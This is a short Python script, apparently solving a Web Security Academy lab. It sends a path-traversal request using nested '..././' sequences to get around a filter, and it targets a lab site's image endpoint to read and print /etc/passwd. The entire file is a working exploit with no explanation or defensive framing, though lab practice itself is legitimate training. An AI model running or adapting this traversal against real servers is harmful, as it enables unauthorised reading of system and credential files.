import requests

DOMAIN = "0a8a00bc039cc2f08250330300e600b1.web-security-academy.net"

def get_file_content(path):
    response = requests.get(f"https://{DOMAIN}/image?filename=..././..././..././{path}")
    print(response.text)

get_file_content("/etc/passwd")